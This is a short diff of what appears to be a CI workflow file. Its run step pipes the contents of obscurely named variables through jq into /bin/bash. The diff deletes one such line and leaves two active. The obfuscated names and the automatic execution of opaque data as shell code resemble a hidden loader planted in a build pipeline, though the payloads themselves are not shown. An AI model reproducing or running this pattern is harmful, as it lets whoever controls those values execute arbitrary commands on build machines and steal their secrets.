@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$k8482" | jq -r .qse2445 | /bin/bash
           echo $gynzz75723 | jq -r .njn853 | /bin/bash
-          printf '%s' "$nfwbh7" | jq -r .tuen8 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
